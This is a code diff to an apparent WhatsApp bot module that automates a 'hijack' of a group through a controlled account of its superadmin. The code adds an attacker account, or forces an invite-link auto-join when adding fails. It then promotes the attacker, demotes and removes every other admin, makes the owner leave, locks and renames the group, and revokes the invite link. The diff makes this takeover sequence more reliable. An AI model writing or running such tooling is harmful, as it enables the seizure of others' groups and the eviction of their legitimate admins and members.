@@ -24,23 +24,8 @@ const FULL_ANNOUNCEMENT =
 
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-async function demoteAdmins(hijackSock, groupJid, jids) {
-    if (!jids.length) return { demoted: 0, failed: 0 };
-    let demoted = 0, failed = 0;
-    try {
-        await hijackSock.groupParticipantsUpdate(groupJid, jids, 'demote');
-        return { demoted: jids.length, failed: 0 };
-    } catch {}
-    for (const j of jids) {
-        try { await hijackSock.groupParticipantsUpdate(groupJid, [j], 'demote'); demoted++; }
-        catch { failed++; }
-        await sleep(1500);
-    }
-    return { demoted, failed };
-}
-
 async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log) {
-    for (let i = 0; i < 20; i++) {
+    for (let i = 0; i < 15; i++) {
         try {
             const meta = await attackerSock.groupMetadata(groupJid);
             const me = meta.participants.find(p => extractPhone(p.id) === extractPhone(attackerJid) || extractPhone(p.lid) === extractPhone(attackerJid));
@@ -54,8 +39,9 @@ async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log
 async function lockAndRename(attackerSock, groupJid, log) {
     let locked = false, renamed = false, announced = false;
 
+    // Force metadata refresh before acting
     try { await attackerSock.groupMetadata(groupJid); } catch {}
-    await sleep(2000);
+    await sleep(3000);
 
     for (let i = 0; i < 3 && !locked; i++) {
         try { await attackerSock.groupSettingUpdate(groupJid, 'announcement'); locked = true; }
@@ -84,22 +70,14 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
         aborted: false, reason: null,
     };
 
-    // 1 — resolve target
+    // 1 — Resolve Target
     onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
-    let meta;
-    try {
-        meta = await targetSock.groupMetadata(groupJid);
-    } catch (e) {
-        throw new Error(`meta: ${e.message}`);
-    }
-    
+    const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
     const targetPhone = extractPhone(targetSock.user?.id);
     const targetLid   = extractPhone(targetSock.user?.lid);
 
     const targetPart = meta.participants.find(p => {
-        const pId    = extractPhone(p.id);
-        const pLid   = extractPhone(p.lid);
-        const pPhone = extractPhone(p.phoneNumber);
+        const pId = extractPhone(p.id), pLid = extractPhone(p.lid), pPhone = extractPhone(p.phoneNumber);
         if (pId === targetPhone || pLid === targetPhone || pPhone === targetPhone) return true;
         if (targetLid && (pId === targetLid || pLid === targetLid || pPhone === targetLid)) return true;
         if (p.id === targetSock.user?.id) return true;
@@ -110,10 +88,9 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
     if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
     if (rankOf(targetPart) !== 2) { result.aborted = true; result.reason = 'target not superadmin'; return result; }
 
-    // 2 — scan for contests
+    // 2 — Scan Contests
     onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
     const otherSupers = meta.participants.filter(p => p !== targetPart && rankOf(p) === 2);
-
     if (otherSupers.length) {
         result.contested = true;
         let anyAlive = false;
@@ -126,87 +103,90 @@ async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock,
         result.contestedSafe = true;
     }
 
-    // 3 — THE LOOPHOLE FIX: Auto-join mechanism
-    onPhase?.('ᴄʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋᴇʀ');
+    // 3 — Get Attacker In
+    onPhase?.('ᴀᴅᴅ ᴀᴛᴛᴀᴄᴋᴇʀ');
     const present = meta.participants.some(p => extractPhone(p.id) === extractPhone(attackerJid));
-    let addedSuccess = false;
+    let addedSuccess = present;
 
-    if (present) {
-        addedSuccess = true;
-    } else {
-        // Try target adding attacker
-        onPhase?.('ᴀᴅᴅ ᴀᴛᴛᴀᴄᴋᴇʀ');
-        try {
-            await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add');
-            addedSuccess = true;
-            await sleep(2000);
-        } catch (e) { log?.(`[hijack:add] ${e.message}`); }
+    if (!present) {
+        try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add'); addedSuccess = true; }
+        catch (e) { log?.(`[hijack:add] ${e.message}`); }
 
-        // If add fails (privacy settings), use link auto-join
         if (!addedSuccess) {
-            onPhase?.('ᴀᴜᴛᴏ-ᴊᴏɪɴ ᴀᴛᴛᴀᴄᴋᴇʀ');
+            onPhase?.('ᴀᴜᴛᴏ-ᴊᴏɪɴ');
             try {
-                // Force open the group so no admin approval is needed
                 await targetSock.groupSettingUpdate(groupJid, 'not_announcement').catch(() => {});
                 await targetSock.groupMemberAddMode(groupJid, 'all_member_add').catch(() => {});
-                
                 const inviteCode = await targetSock.groupInviteCode(groupJid);
-                if (inviteCode) {
-                    await attackerSock.groupAcceptInvite(inviteCode);
-                    addedSuccess = true;
-                    await sleep(3000); // wait for attacker to sync
-                }
-            } catch (e) {
-                log?.(`[hijack:autojoin] ${e.message}`);
-            }
+                if (inviteCode) { await attackerSock.groupAcceptInvite(inviteCode); addedSuccess = true; }
+            } catch (e) { log?.(`[hijack:autojoin] ${e.message}`); }
         }
     }
 
-    // ABORT if we couldn't get the attacker in!
-    if (!addedSuccess) {
-        result.aborted = true;
-        result.reason = 'failed to add attacker (add + auto-join failed)';
-        return result;
-    }
+    if (!addedSuccess) { result.aborted = true; result.reason = 'failed to add attacker'; return result; }
     result.added = true;
+    await sleep(3000);
 
-    // 4 — promote attacker
+    // 4 — PROMOTE ATTACKER (The critical fix)
     onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
-    try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); result.promoted = true; }
-    catch (e) { log?.(`[hijack:promote] ${e.message}`); }
-    await sleep(2000);
+    try { 
+        await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); 
+        result.promoted = true; 
+    } catch (e) { log?.(`[hijack:promote] ${e.message}`); }
+    
+    await sleep(3000);
+    result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
+    if (!result.promotedToSuper) { 
+        result.aborted = true; 
+        result.reason = 'attacker not promoted (socket issue)'; 
+        return result; 
+    }
 
-    // 5 — demote others
+    // 5 — JOINT DEMOTION (Split workload)
     onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
     const otherAdmins = meta.participants.filter(p => p !== targetPart && rankOf(p) === 1).map(p => p.id);
-    const dem = await demoteAdmins(targetSock, groupJid, otherAdmins);
-    result.demoted = dem.demoted;
+    
+    if (otherAdmins.length > 0) {
+        // Target does 70% of the demotions
+        const targetChunk = otherAdmins.slice(0, Math.ceil(otherAdmins.length * 0.7));
+        // Attacker does 30% of the demotions
+        const attackerChunk = otherAdmins.slice(Math.ceil(otherAdmins.length * 0.7));
 
-    // 6 — remove others
+        if (targetChunk.length > 0) {
+            try { await targetSock.groupParticipantsUpdate(groupJid, targetChunk, 'demote'); result.demoted += targetChunk.length; } 
+            catch (e) { log?.(`[demote:target] ${e.message}`); }
+            await sleep(1500);
+        }
+
+        if (attackerChunk.length > 0) {
+            try { await attackerSock.groupParticipantsUpdate(groupJid, attackerChunk, 'demote'); result.demoted += attackerChunk.length; } 
+            catch (e) { log?.(`[demote:attacker] ${e.message}`); }
+            await sleep(1500);
+        }
+    }
+
+    // 6 — Remove them entirely
     onPhase?.('ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs');
     for (const j of otherAdmins) {
-        try { await targetSock.groupParticipantsUpdate(groupJid, [j], 'remove'); result.removed++; }
+        try { await attackerSock.groupParticipantsUpdate(groupJid, [j], 'remove'); result.removed++; }
         catch (e) { log?.(`[hijack:remove] ${e.message}`); }
         await sleep(1000);
     }
 
-    // 7 — target leaves
+    // 7 — Target Leaves
     onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
+    await sleep(3000); // Let WA settle before dropping the owner
     try { await targetSock.groupLeave(groupJid); result.left = true; }
     catch (e) { log?.(`[hijack:leave] ${e.message}`); }
 
-    // 8 — wait for superadmin
-    onPhase?.('ᴡᴀɪᴛ sᴜᴘᴇʀᴀᴅᴍɪɴ');
-    result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
-    if (!result.promotedToSuper) { result.aborted = true; result.reason = 'attacker not promoted'; return result; }
-
-    // 9 & 10 — lock, rename, revoke
+    // 8 — Lock, Rename, Announce
     onPhase?.('ʟᴏᴄᴋ + ʀᴇɴᴀᴍᴇ');
     const lr = await lockAndRename(attackerSock, groupJid, log);
     result.locked = lr.locked;
     result.renamed = lr.renamed;
     result.announced = lr.announced;
 
+    // 9 — Revoke Link
     onPhase?.('ʀᴇᴠᴏᴋᴇ ɪɴᴠɪᴛᴇ');
     try {
         const code = await attackerSock.groupRevokeInvite(groupJid);
@@ -302,11 +282,10 @@ module.exports = {
                 `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`,
                 `┃ ${result.contested ? (result.contestedSafe ? '🟡 ᴄᴏɴᴛᴇsᴛᴇᴅ (sᴀғᴇ)' : '🔴 ᴄᴏɴᴛᴇsᴛᴇᴅ') : '🟢 ᴜɴᴄᴏɴᴛᴇsᴛᴇᴅ'}`,
                 `┃ ${result.added ? '✅' : '❌'} ᴀᴅᴅᴇᴅ`,
-                `┃ ${result.promoted ? '✅' : '❌'} ᴘʀᴏᴍᴏᴛᴇᴅ`,
+                `┃ ${result.promotedToSuper ? '✅' : '❌'} sᴜᴘᴇʀᴀᴅᴍɪɴ`,
                 `┃ 📉 ᴅᴇᴍᴏᴛᴇᴅ ${result.demoted}`,
                 `┃ 🚫 ʀᴇᴍᴏᴠᴇᴅ ${result.removed}`,
                 `┃ ${result.left ? '✅' : '❌'} ᴛᴀʀɢᴇᴛ ʟᴇғᴛ`,
-                `┃ ${result.promotedToSuper ? '✅' : '❌'} sᴜᴘᴇʀᴀᴅᴍɪɴ`,
                 `┃ ${result.locked ? '✅' : '❌'} ʟᴏᴄᴋᴇᴅ`,
                 `┃ ${result.renamed ? '✅' : '❌'} ʀᴇɴᴀᴍᴇᴅ`,
                 `┃ ${result.announced ? '✅' : '❌'} ᴀɴɴᴏᴜɴᴄᴇᴅ`,
